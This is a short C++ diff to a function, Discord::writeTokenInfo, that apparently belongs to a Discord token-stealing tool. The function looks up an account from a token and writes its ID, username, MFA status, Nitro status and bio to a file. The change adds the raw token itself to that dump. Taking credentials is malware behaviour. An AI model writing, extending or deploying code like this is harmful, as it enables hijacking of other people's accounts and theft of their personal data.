@@ -24,6 +24,8 @@ void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {
 
     json resp = json::parse(request.first);
     std::stringstream ss;
+    ss << "TOKEN: " << token << "\n";
+    ss << "\n";
     ss << "ID: " << std::string(resp["id"]) << "\n";
     ss << "USERNAME: " << std::string(resp["username"]) << "\n";
     ss << "GLOBAL NAME: " << std::string(resp["global_name"]) << "\n";
@@ -37,7 +39,7 @@ void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {
     ss << "NSFW ALLOWED: " << ((resp["nsfw_allowed"] == true) ? "Yes" : "No") << "\n";
     ss << "\n";
     ss << "MFA ENABLED: " << ((resp["mfa_enabled"] == true) ? "Yes" : "No") << "\n";
-    ss << "";
+    ss << "\n";
     ss << "NITRO: " << ((resp["premium_type"] == 1) ? "Yes" : "No") << "\n";
 
     std::string bio = StringUtil::replace(std::string(resp["bio"]), "\n", " ");
